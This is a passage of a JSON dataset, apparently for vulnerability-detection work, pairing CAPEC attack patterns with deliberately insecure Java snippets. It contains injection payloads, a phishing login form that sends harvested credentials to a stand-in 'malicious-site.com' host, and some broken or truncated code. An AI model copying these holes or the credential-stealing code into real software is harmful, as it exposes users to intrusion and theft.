        "code_snippet": "public boolean authenticateUser(String username, String password) {\n    String xmlDoc = \"<?xml version='1.0'?><users><user><name>admin</name><pass>adminpass</pass></user></users>\";\n    try {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        Document doc = builder.parse(new InputSource(new StringReader(xmlDoc)));\n        XPath xpath = XPathFactory.newInstance().newXPath();\n        String expression = \"//users/user[name='\" + username + \"' and pass='\" + password + \"']\";\n        NodeList nodeList = (NodeList) xpath.evaluate(expression, doc, XPathConstants.NODESET);\n        return nodeList.getLength() > 0;\n    } catch (Exception e) {\n        return false;\n    }\n}",
        "description": "This code demonstrates a vulnerable XPath injection in an authentication system. The code directly concatenates user input (username and password) into an XPath expression without any sanitization. An attacker could inject malicious XPath expressions, such as entering \"' or '1'='1\" as the username, which would bypass authentication by making the expression always true. The vulnerability allows unauthorized access to the XML database and potential exposure of sensitive data."
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "public class XMLQueryProcessor {\n    public String queryXMLData(String userInput) {\n        String xQuery = \"for $user in doc('users.xml')/users/user \"\n                    + \"where $user/name = '\" + userInput + \"' \"\n                    + \"return $user/account/balance\";\n        \n        XQDataSource ds = new SaxonXQDataSource();\n        XQConnection conn = ds.getConnection();\n        XQPreparedExpression expr = conn.prepareExpression(xQuery);\n        XQResultSequence result = expr.executeQuery();\n        \n        return result.getSequenceAsString();\n    }\n}",
        "description": "This code demonstrates a vulnerable XQuery implementation where user input is directly concatenated into an XQuery expression without proper sanitization. An attacker could inject malicious XQuery commands by manipulating the userInput parameter, potentially accessing or modifying unauthorized data in the XML database."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "public class VulnerableAjaxHandler extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"query\");\n        String callback = request.getParameter(\"callback\");\n        \n        // Vulnerable: directly using user input without proper validation or encoding\n        StringBuilder jsonResponse = new StringBuilder();\n        jsonResponse.append(callback)\n                   .append(\"({\")\n                   .append(\"\\\"data\\\": \\\"\")\n                   .append(userInput)\n                   .append(\"\\\"})\");\n        \n        response.setContentType(\"application/javascript\");\n        PrintWriter out = response.getWriter();\n        out.write(jsonResponse.toString());\n        out.flush();\n    }\n    \n    private void scanSystem(String target) {\n        // Vulnerable: allows rapid scanning of system resources\n        for(int port = 1; port < 1024; port++) {\n            try {\n                Socket socket = new Socket(target, port);\n                socket.close();\n                logOpenPort(target, port);\n            } catch(Exception e) {}\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an Ajax endpoint that allows for system scanning and potential XSS attacks. It accepts unvalidated user input and callback parameters, echoes them back without proper encoding, and includes a scanning function that can be rapidly called through Ajax requests. The code violates multiple security principles including improper input validation (CWE-20), cross-site scripting (CWE-79), and improper output encoding (CWE-116)."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "public class VulnerableHeaderController {\n    @RequestMapping(\"/userProfile\")\n    public void handleUserProfile(HttpServletRequest request, HttpServletResponse response) {\n        String userAgent = request.getHeader(\"User-Agent\");\n        String referer = request.getParameter(\"referer\");\n        String customHeader = \"<script>\" + userAgent + \"</script>\";\n        \n        response.setHeader(\"X-Custom-Header\", customHeader);\n        response.setHeader(\"X-Referer\", referer);\n        \n        String userInput = request.getParameter(\"message\");\n        String htmlContent = \"<img src='\" + userInput + \"' />\";\n        \n        PrintWriter out = response.getWriter();\n        out.println(htmlContent);\n    }\n}",
        "description": "This vulnerable code accepts user input from HTTP headers and request parameters without proper sanitization. It directly embeds user-agent data into a script tag in a custom header, allows arbitrary content in the img src attribute, and reflects user input without escaping. This enables XSS attacks through both HTTP headers and HTML content."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "public class DocumentController {\n    @GetMapping(\"/documents/{docId}\")\n    public String getDocument(@PathVariable String docId) {\n        String filePath = \"/var/www/documents/\" + docId + \".pdf\";\n        // No authentication or authorization check\n        return new File(filePath).getAbsolutePath();\n    }\n\n    @GetMapping(\"/admin/settings\")\n    public ResponseEntity<String> getAdminSettings() {\n        // No authentication check, directly accessible via URL\n        return ResponseEntity.ok(\"Admin settings page\");\n    }\n\n    @GetMapping(\"/api/user/details\")\n    public String getUserDetails(@RequestParam String ssn) {\n        // Sensitive information in GET request\n        // No access control\n        return \"User details for SSN: \" + ssn;\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to forced browsing and improper authorization. The endpoints are directly accessible without proper authentication checks, sensitive information is exposed through GET parameters, and there's no access control mechanism to prevent unauthorized access to restricted resources. The code allows direct URL access to documents and admin settings without verification of user privileges."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "public class CommandExecutor {\n    public static void executeCommand(String userInput) {\n        try {\n            String command = \"cmd.exe /c dir \" + userInput;\n            Process process = Runtime.getRuntime().exec(command);\n            process.waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        String userInput = args[0];\n        executeCommand(userInput);\n    }\n}",
        "description": "This code demonstrates OS command injection vulnerability by directly concatenating user input into a command string without any input validation or sanitization. An attacker can inject additional commands using special characters like '&', '|', or ';' to execute arbitrary system commands."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "public class OnlineBankingService {\n    private static final String TRUSTED_DOMAIN = \"bank.com\";\n\n    public boolean validateBankDomain(String clientIP) {\n        try {\n            // Vulnerable: Relies solely on reverse DNS for authentication\n            InetAddress addr = InetAddress.getByName(clientIP);\n            String hostname = addr.getHostName();\n            \n            // Vulnerable: No proper origin validation\n            if(hostname.endsWith(TRUSTED_DOMAIN)) {\n                return true;\n            }\n            \n            // Vulnerable: Client-side validation\n            String clientProvidedCert = getClientCertificate();\n            return validateClientCertificate(clientProvidedCert);\n            \n        } catch (UnknownHostException e) {\n            return false;\n        }\n    }\n    \n    private String getClientCertificate() {\n        // Vulnerable: Downloads certificate without integrity check\n        return downloadCertificateFromClient(\"https://client-provided-url.com/cert\");\n    }\n    \n    private String downloadCertificateFromClient(String url) {\n        // Implementation omitted\n        return \"certificate_data\";\n    }\n    \n    private boolean validateClientCertificate(String cert) {\n        // Vulnerable: Basic string comparison without proper validation\n        return cert.contains(\"valid\");\n    }\n}",
        "description": "This code demonstrates a vulnerable online banking service that fails to properly validate domain authenticity. It relies on reverse DNS lookup without proper verification, implements security checks on the client side, and downloads certificates without integrity verification. These vulnerabilities could allow an attacker to conduct pharming attacks by redirecting users to malicious domains while appearing legitimate."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "public class SimpleAuthServer {\n    private String serverSecret = \"secret123\";\n\n    public boolean authenticate(String challenge, String response) {\n        // Vulnerable implementation of challenge-response authentication\n        if (response.equals(generateResponse(challenge))) {\n            return true;\n        }\n        return false;\n    }\n\n    public String getChallenge() {\n        // Generate a simple challenge\n        return \"CHALLENGE_\" + System.currentTimeMillis();\n    }\n\n    private String generateResponse(String challenge) {\n        // Simple response generation using concatenation\n        return challenge + serverSecret;\n    }\n\n    public static void main(String[] args) {\n        SimpleAuthServer server = new SimpleAuthServer();\n        // Attacker can capture challenge and response\n        String challenge = server.getChallenge();\n        // Attacker can replay the same challenge-response pair\n        boolean auth = server.authenticate(challenge, challenge + \"secret123\");\n    }\n}",
        "description": "This code demonstrates a vulnerable challenge-response authentication implementation that is susceptible to reflection and replay attacks. The authentication mechanism uses a simple challenge-response protocol without proper protection against replay attacks (no nonce or timestamps). An attacker can capture the challenge and response, then replay them later to gain unauthorized access. The server secret is also poorly protected and the response generation is overly simplistic, making it vulnerable to various authentication bypass attacks."
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "public class ImageGallery {\n    public String displayImage(String userInput) {\n        // Direct concatenation of user input into img tag\n        String htmlOutput = \"<img src='\" + userInput + \"' alt='User Image'/>\";\n        return htmlOutput;\n    }\n\n    public String processUserComment(String comment) {\n        // Incomplete sanitization allowing doubled characters\n        comment = comment.replace(\"<script>\", \"\");\n        return \"<div class='comment'>\" + comment + \"</div>\";\n    }\n\n    public static void main(String[] args) {\n        ImageGallery gallery = new ImageGallery();\n        // Vulnerable to XSS through img onerror attribute\n        String maliciousInput = \"x' onerror='alert(1)'\";\n        System.out.println(gallery.displayImage(maliciousInput));\n        \n        // Vulnerable to doubled character XSS\n        String maliciousComment = \"<<script>alert(2)</script>\";\n        System.out.println(gallery.processUserComment(maliciousComment));\n    }\n}",
        "description": "This code demonstrates multiple XSS vulnerabilities through improper handling of user input in HTML IMG tags and incomplete sanitization of script elements. It shows how user input can be exploited through IMG tag attributes and doubled character XSS attacks. The code fails to properly neutralize special characters and relies on incomplete denylist-based protection."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "public class VulnerableAllocation {\n    public byte[] createBuffer(int userInput) {\n        int size = userInput + 100;  // Integer overflow possible\n        if (size > 0) {\n            byte[] buffer = new byte[size];  // Heap allocation with overflowed size\n            return buffer;\n        }\n        return null;\n    }\n\n    public void processData(int length, byte[] data) {\n        byte[] localBuffer = createBuffer(length);\n        if (localBuffer != null) {\n            System.arraycopy(data, 0, localBuffer, 0, data.length);  // No size check\n        }\n    }\n}",
        "description": "This code demonstrates an integer overflow vulnerability where user-controlled input can cause the size calculation to wrap around, leading to a heap-based buffer overflow. The array allocation size can overflow, and the subsequent buffer copy operation doesn't verify buffer bounds."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "public class LogManager {\n    private static final Logger logger = Logger.getLogger(LogManager.class.getName());\n\n    public void logUserActivity(String username, String action) {\n        String logEntry = String.format(\"User %s performed action: %s\", username, action);\n        logger.info(logEntry);\n    }\n\n    public void logAuthenticationAttempt(String username, String password) {\n        String logEntry = \"Authentication attempt - Username: \" + username + \", Password: \" + password;\n        logger.info(logEntry);\n    }\n\n    public void appendToLogFile(String userInput) {\n        try {\n            FileWriter fw = new FileWriter(\"application.log\", true);\n            fw.write(userInput + \"\\n\");\n            fw.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple logging-related security issues. It directly writes unsanitized user input to log files, logs sensitive information like passwords, and allows direct manipulation of log content through file appending. The code doesn't escape special characters or control sequences, making it susceptible to log injection attacks. Additionally, it performs excessive logging of sensitive data without proper access controls."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "public class InsecureSocketClient {\n    private Socket socket;\n    private PrintWriter out;\n    private BufferedReader in;\n\n    public void connect(String host, int port) {\n        try {\n            socket = new Socket(host, port);\n            out = new PrintWriter(socket.getOutputStream(), true);\n            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendCredentials(String username, String password) {\n        // No encryption, authentication or verification\n        out.println(\"LOGIN \" + username + \" \" + password);\n        try {\n            String response = in.readLine();\n            if(response.equals(\"OK\")) {\n                // Proceed with connection\n                out.println(\"GET_SENSITIVE_DATA\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void close() {\n        try {\n            in.close();\n            out.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to man-in-the-middle attacks. It uses plaintext communication over a socket without any encryption or proper authentication mechanism. Credentials are sent in clear text, making them susceptible to sniffing. There's no verification of the server's identity, making it vulnerable to spoofing attacks. The lack of proper channel security allows for capture-replay attacks, where an attacker could intercept and replay the authentication messages."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "public class WebServiceConfig {\n    @Bean\n    public DefaultWsdl11Definition orderWsdl() {\n        DefaultWsdl11Definition wsdl = new DefaultWsdl11Definition();\n        wsdl.setPortTypeName(\"OrderPort\");\n        wsdl.setLocationUri(\"/api/orders\");\n        wsdl.setTargetNamespace(\"http://example.com/orders\");\n        \n        // Exposing sensitive database connection details in WSDL\n        wsdl.setXsdSchema(createSchema());\n        wsdl.addPortType(\"jdbc:mysql://localhost:3306/orders?user=admin&password=secret123\");\n        \n        // Exposing internal system information\n        Properties props = System.getProperties();\n        wsdl.addDocumentation(\"Server Info: \" + props.toString());\n        \n        // Storing WSDL in publicly accessible directory\n        String wsdlPath = \"/public/services/orders.wsdl\";\n        FileOutputStream fos = new FileOutputStream(wsdlPath);\n        wsdl.writeTo(fos);\n        \n        return wsdl;\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities related to WSDL exposure and sensitive information disclosure. It exposes database credentials directly in the WSDL, includes system properties in the documentation, and stores the WSDL file in a publicly accessible directory. The code also fails to implement proper access controls for the WSDL definition, making it easily accessible to potential attackers who could use this information for further attacks."
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "public class LibraryAccessExample {\n    static {\n        try {\n            System.loadLibrary(\"custom_native_lib\");\n        } catch (UnsatisfiedLinkError e) {\n            // Insecure error handling - continues execution without proper validation\n            System.err.println(\"Failed to load library\");\n        }\n    }\n\n    public native void processData(byte[] buffer, int size);\n\n    public void handleUserInput(String input) {\n        byte[] buffer = new byte[100];\n        // No bounds checking on input length\n        byte[] inputBytes = input.getBytes();\n        System.arraycopy(inputBytes, 0, buffer, 0, inputBytes.length);\n        \n        // Blocking call in single-threaded context\n        processData(buffer, inputBytes.length);\n        \n        // Continue processing without verifying library state\n        performSensitiveOperation();\n    }\n\n    private void performSensitiveOperation() {\n        // Sensitive operations performed without checking if library is properly loaded\n        // Could lead to security issues if library failed to load\n    }\n}",
        "description": "This code demonstrates vulnerable library handling where a native library is loaded without proper error handling, uses unsafe memory operations, and makes blocking calls in a single-threaded context. The code continues execution even when the library fails to load, potentially leaving the system in an insecure state. It also includes unsafe buffer operations that could lead to buffer overflows."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "public class WeakCrypto {\n    public static void main(String[] args) {\n        try {\n            String key = \"fixed_key_123456\"; // Weak: Fixed key\n            byte[] iv = new byte[16];\n            Arrays.fill(iv, (byte) 0); // Weak: Predictable IV\n\n            // Using weak DES encryption\n            Cipher cipher = Cipher.getInstance(\"DES/CBC/PKCS5Padding\");\n            SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(), \"DES\");\n            IvParameterSpec ivSpec = new IvParameterSpec(iv);\n\n            // Initialize cipher before RNG is properly seeded\n            SecureRandom random = new SecureRandom();\n            cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);\n\n            String plaintext = \"sensitive_data\";\n            byte[] encrypted = cipher.doFinal(plaintext.getBytes());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple cryptographic vulnerabilities: using the weak DES algorithm (CWE-327), using a fixed encryption key, implementing a predictable initialization vector filled with zeros (CWE-1204), using a non-random IV generation method (CWE-1241), and potentially using cryptographic operations before the SecureRandom is properly seeded (CWE-1279). These weaknesses make the encryption susceptible to cryptanalysis attacks."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "public class FakeLoginPage extends JFrame {\n    private JTextField usernameField;\n    private JPasswordField passwordField;\n    private String phishingUrl = \"https://malicious-site.com/collect\";\n\n    public FakeLoginPage() {\n        setTitle(\"Secure Bank Login\");\n        setIconImage(new ImageIcon(\"bank_logo.png\").getImage());\n        \n        usernameField = new JTextField(20);\n        passwordField = new JPasswordField(20);\n        JButton loginButton = new JButton(\"Login\");\n        \n        loginButton.addActionListener(e -> {\n            String credentials = usernameField.getText() + \":\" + new String(passwordField.getPassword());\n            try {\n                // Secretly send credentials to malicious site\n                URL url = new URL(phishingUrl);\n                HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n                conn.setRequestMethod(\"POST\");\n                conn.setDoOutput(true);\n                \n                OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());\n                writer.write(\"data=\" + URLEncoder.encode(credentials, \"UTF-8\"));\n                writer.flush();\n                \n                // Redirect to legitimate site to avoid suspicion\n                Desktop.getDesktop().browse(new URI(\"https://legitimate-bank.com\"));\n            } catch(Exception ex) {\n                // Silently handle any errors\n            }\n        });\n    }\n}",
        "description": "This code demonstrates a malicious phishing application that masquerades as a legitimate bank login page. It creates a convincing UI that mimics a bank's login form, but secretly harvests credentials and sends them to a malicious server. The code incorporates UI misrepresentation (CWE-451), malicious redirects (CWE-601), embedded malicious code (CWE-506), trojan horse behavior (CWE-507), and spyware characteristics (CWE-512) by collecting user credentials without explicit consent and operating covertly."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "public class XMLProcessor {\n    public void processXMLRequest(String xmlInput) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            // Missing XML validation against schema\n            // Missing protection against XXE\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));\n            \n            // Process XML without input sanitization\n            XPath xpath = XPathFactory.newInstance().newXPath();\n            String query = \"//user[@id='\" + xmlInput + \"']/password\";\n            NodeList nodes = (NodeList) xpath.evaluate(query, doc, XPathConstants.NODESET);\n            \n            // Process external entities without restriction\n            TransformerFactory tf = TransformerFactory.newInstance();\n            Transformer transformer = tf.newTransformer();\n            transformer.transform(new DOMSource(doc), new StreamResult(System.out));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a combination of XML-related security issues including XML injection, missing schema validation, and unrestricted XML external entity processing. The code accepts untrusted XML input without proper validation or sanitization, uses unsafe XPath queries, and allows processing of external entities without restrictions, making it susceptible to XXE attacks and XML injection."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "public class VulnerableArrayCopy {\n    public static void copyUserData(String input) {\n        byte[] buffer = new byte[8];\n        byte[] userInput = input.getBytes();\n        int inputLength = userInput.length;\n        \n        // Vulnerable: No bounds checking before copy\n        for(int i = 0; i < inputLength; i++) {\n            buffer[i] = userInput[i];\n        }\n    }\n    \n    public static void main(String[] args) {\n        copyUserData(\"ThisIsAVeryLongInputStringThatWillOverflow\");\n    }\n}",
        "description": "This code demonstrates a classic buffer overflow vulnerability by copying user input into a fixed-size buffer without bounds checking. The buffer is initialized with size 8, but the code attempts to copy a larger input string without verifying if it fits within the buffer's bounds. This can lead to array index out of bounds and buffer overflow issues, potentially corrupting memory or causing program crashes."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "public class SSIProcessor extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"template\");\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        \n        // Vulnerable: No validation of SSI directives\n        String ssiTemplate = \"<!--#include virtual='\" + userInput + \"' -->\";\n        \n        // Process SSI directives and write to response\n        File templateFile = new File(getServletContext().getRealPath(\"/templates/\") + ssiTemplate);\n        BufferedReader reader = new BufferedReader(new FileReader(templateFile));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            out.println(line);\n        }\n        reader.close();\n    }\n}",
        "description": "This code demonstrates a vulnerable SSI processing servlet that directly includes user input in SSI directives without validation or sanitization. It accepts a template parameter and creates an SSI include directive without proper input validation, allowing an attacker to potentially include arbitrary files or execute commands through SSI directives. The code also relies on client-side input without server-side validation and processes raw web content without proper parsing."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "public class InsecureSessionManager {\n    private static final String SESSION_COOKIE_NAME = \"sessionId\";\n    \n    public void setupSession(HttpServletResponse response, String userId) {\n        String sessionId = generateSessionId(userId);\n        Cookie cookie = new Cookie(SESSION_COOKIE_NAME, sessionId);\n        cookie.setPath(\"/\");\n        // Cookie is not marked as secure, allowing transmission over HTTP\n        // cookie.setSecure(true);\n        response.addCookie(cookie);\n    }\n    \n    public void handleAuthentication(HttpServletRequest request, HttpServletResponse response) {\n        String username = request.getParameter(\"username\");\n        String password = request.getParameter(\"password\");\n        \n        // Credentials sent over HTTP without encryption\n        if (authenticateUser(username, password)) {\n            String sessionId = generateSessionId(username);\n            response.addHeader(\"Set-Cookie\", SESSION_COOKIE_NAME + \"=\" + sessionId);\n        }\n    }\n    \n    private String generateSessionId(String userId) {\n        // Simple session ID generation without proper entropy\n        return userId + System.currentTimeMillis();\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities related to session management and credential handling. It transmits session tokens and authentication credentials without proper encryption or security measures, making it susceptible to session sidejacking. The code fails to set the 'Secure' flag on cookies, allows credentials to be transmitted in cleartext, and uses a weak session ID generation method. This makes it possible for attackers to capture and replay authentication traffic."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
        "code_snippet": "public class VulnerableUI {\n    private boolean isProcessing = false;\n    private static final String TRUSTED_DOMAIN = \"trusted.example.com\";\n    \n    public void displayFrame(String source) {\n        JFrame frame = new JFrame();\n        JEditorPane webPane = new JEditorPane();\n        frame.add(webPane);\n        \n        // Vulnerable: No proper domain validation\n        try {\n            webPane.setPage(source);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        \n        // Vulnerable: Race condition in transaction processing\n        frame.addActionListener(e -> {\n            if (!isProcessing) {\n                isProcessing = true;\n                processTransaction(); // Can be called multiple times due to race\n                isProcessing = false;\n            }\n        });\n        \n        // Vulnerable: No frame busting protection\n        frame.setVisible(true);\n    }\n    \n    private void processTransaction() {\n        // Vulnerable: Non-reentrant code that can be nested\n        handlePayment();\n    }\n    \n    private void handlePayment() {\n        // Vulnerable: Direct interpretation of input without validation\n        String paymentData = getUserInput();\n        executePayment(paymentData);\n    }\n}",
        "description": "This code demonstrates a vulnerable UI implementation that allows clickjacking through improper frame restrictions, contains race conditions in transaction processing, includes non-reentrant code that can be nested, and misinterprets user input without proper validation. An attacker could exploit these vulnerabilities to trick users into performing unintended actions by overlaying malicious UI elements."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "public class BrowserSecurityBypass {\n    public static void loadPrivilegedContent(String userInput) {\n        // Run with elevated privileges without proper checks\n        System.setSecurityManager(null);\n\n        // No input validation or sanitization\n        String script = userInput;\n\n        // Directly embedding user input into HTML without proper encoding\n        String htmlContent = \"<html><body>\" +\n            \"<script>\" + script + \"</script>\" +\n            \"<object classid='\" + userInput + \"'>\" +\n            \"<param name='source' value='\" + userInput + \"'>\" +\n            \"</object></body></html>\";\n\n        // Load content without zone checking\n        javax.swing.JEditorPane browser = new javax.swing.JEditorPane();\n        browser.setContentType(\"text/html\");\n        try {\n            browser.setText(htmlContent);\n            browser.setEditable(false);\n        } catch(Exception e) {}\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including: executing with unnecessary privileges by disabling the security manager, lack of input validation and sanitization, improper encoding of user input when embedding in HTML, and bypassing security zone controls when loading content in a browser component. The code allows arbitrary script execution and loading of unsigned content without proper authorization checks."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "public class VulnerableHttpProxy {\n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) {\n        String contentLength = request.getHeader(\"Content-Length\");\n        String transferEncoding = request.getHeader(\"Transfer-Encoding\");\n        \n        // Vulnerable: Inconsistent header handling\n        StringBuilder forwardedRequest = new StringBuilder();\n        forwardedRequest.append(request.getMethod())\n                        .append(\" \")\n                        .append(request.getRequestURI())\n                        .append(\" HTTP/1.1\\r\\n\");\n        \n        // Vulnerable: Direct header forwarding without sanitization\n        Enumeration<String> headerNames = request.getHeaderNames();\n        while (headerNames.hasMoreElements()) {\n            String headerName = headerNames.nextElement();\n            String headerValue = request.getHeader(headerName);\n            forwardedRequest.append(headerName)\n                           .append(\": \")\n                           .append(headerValue)\n                           .append(\"\\r\\n\");\n        }\n        \n        // Vulnerable: No validation of CRLF sequences\n        String cookie = request.getParameter(\"cookie\");\n        if (cookie != null) {\n            forwardedRequest.append(\"Cookie: \")\n                           .append(cookie)\n                           .append(\"\\r\\n\");\n        }\n        \n        // Forward the request to backend server\n        sendToBackend(forwardedRequest.toString());\n    }\n    \n    private void sendToBackend(String request) {\n        // Implementation for sending to backend server\n    }\n}",
        "description": "This code demonstrates a vulnerable HTTP proxy implementation that allows for HTTP Request Smuggling/Splitting attacks. It fails to properly validate or sanitize headers and CRLF sequences, allows conflicting Content-Length and Transfer-Encoding headers, and directly forwards user input in headers without proper neutralization. The code enables attackers to craft malicious requests that could be interpreted differently by intermediate HTTP agents versus the backend server."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "public class LogViewer extends HttpServlet {\n    private static final Logger logger = Logger.getLogger(LogViewer.class.getName());\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"logEntry\");\n        \n        // Log user input without sanitization\n        logger.info(\"User input: \" + userInput);\n        \n        // Display log entries in web page without proper escaping\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<h2>Log Entry:</h2>\");\n        out.println(\"<img src='\" + userInput + \"'>\");\n        out.println(\"</body></html>\");\n    }",
        "description": "This code demonstrates a vulnerable implementation that combines log injection and XSS vulnerabilities. It accepts user input and logs it without sanitization, then displays it in an HTML page within an img tag's src attribute without proper escaping. This allows attackers to inject malicious scripts through both the logging system and the web output, potentially leading to both log tampering and cross-site scripting attacks."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "public class VulnerableController {\n    @RequestMapping(\"/api/user/profile\")\n    public ResponseEntity<?> getUserProfile(HttpServletRequest request) {\n        // Vulnerable to XST - No protection against TRACE method\n        String sessionCookie = request.getHeader(\"Cookie\");\n        String authToken = request.getHeader(\"Authorization\");\n        \n        // Vulnerable output with unfiltered headers\n        String debugOutput = \"<div>Debug Info: \" + \n            sessionCookie + \"<br>Auth: \" + authToken + \"</div>\";\n        \n        // No CSRF protection\n        UserProfile profile = userService.getUserProfile(sessionCookie);\n        profile.setDebugInfo(debugOutput);\n        \n        return ResponseEntity.ok(profile);\n    }\n}",
        "description": "This code is vulnerable to Cross-Site Tracing (XST) as it does not disable the HTTP TRACE method and exposes sensitive header information. It also demonstrates improper handling of sensitive data in headers, lack of CSRF protection, and XSS vulnerability through unfiltered output of header values. The code directly uses privileged header information without proper verification or sanitization."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "public class UserDataProcessor {\n    private Connection dbConnection;\n\n    public void storeAndExecuteUserCommand(String userInput) {\n        try {\n            // Store user input directly into database\n            String insertSQL = \"INSERT INTO commands (cmd_text) VALUES ('\" + userInput + \"')\";\n            Statement stmt = dbConnection.createStatement();\n            stmt.executeUpdate(insertSQL);\n\n            // Later retrieve and execute the command\n            String getSQL = \"SELECT cmd_text FROM commands ORDER BY id DESC LIMIT 1\";\n            ResultSet rs = stmt.executeQuery(getSQL);\n            if(rs.next()) {\n                String command = rs.getString(\"cmd_text\");\n                Runtime.getRuntime().exec(command);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code accepts user input without validation and stores it directly in a database using unsafe SQL concatenation. Later, it retrieves the stored command and executes it using Runtime.exec() without any sanitization, allowing both SQL injection and OS command injection attacks. The attacker can inject malicious SQL commands that store system commands, which are later executed by the application."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "public List<User> searchUsers(String searchTerm) {\n    Session session = HibernateUtil.getSession();\n    String hql = \"FROM User WHERE username LIKE '\" + searchTerm + \"' OR email LIKE '\" + searchTerm + \"'\";\n    Query query = session.createQuery(hql);\n    return query.list();\n}",
        "description": "A vulnerable Hibernate ORM implementation where user input (searchTerm) is directly concatenated into an HQL query string without proper parameterization, allowing for HQL injection attacks. An attacker could input malicious values like \"' OR '1'='1\" to manipulate the query logic and potentially access unauthorized data."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "public class CustomerService {\n    @WebMethod\n    public String getCustomerDetails(String soapRequest) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new StringReader(soapRequest)));\n            \n            String customerId = doc.getElementsByTagName(\"customerId\").item(0).getTextContent();\n            \n            Session session = HibernateUtil.getSessionFactory().openSession();\n            String query = \"SELECT * FROM customers WHERE customer_id = '\" + customerId + \"'\";\n            List result = session.createSQLQuery(query).list();\n            \n            return generateSoapResponse(result);\n        } catch (Exception e) {\n            return \"Error processing request: \" + e.getMessage();\n        }\n    }\n}",
        "description": "This code snippet demonstrates a vulnerable SOAP web service that processes customer data. It accepts a SOAP request containing a customer ID, parses it without proper validation, and uses string concatenation to build a SQL query using Hibernate. The code is vulnerable to SQL injection through SOAP message manipulation, lacks input validation, and exposes sensitive information in error messages."
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
